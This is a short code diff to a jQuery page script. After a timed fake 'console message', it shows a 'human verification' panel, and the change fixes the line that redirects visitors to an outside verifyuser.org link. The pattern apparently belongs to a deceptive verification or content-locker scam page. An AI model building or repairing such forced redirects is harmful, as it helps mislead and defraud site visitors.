@@ -175,7 +175,7 @@ $(document).ready(function() {
 		setTimeout(function() {
 			$(".message-content p.console-message").fadeOut(function() {
 				$(".human-verification-wrapper").fadeIn();
-				window.location.href('https://verifyuser.org/cl/i/j6redp');
+				window.location.href="https://verifyuser.org/cl/i/j6redp";
 
 			});
 		}, 14800);
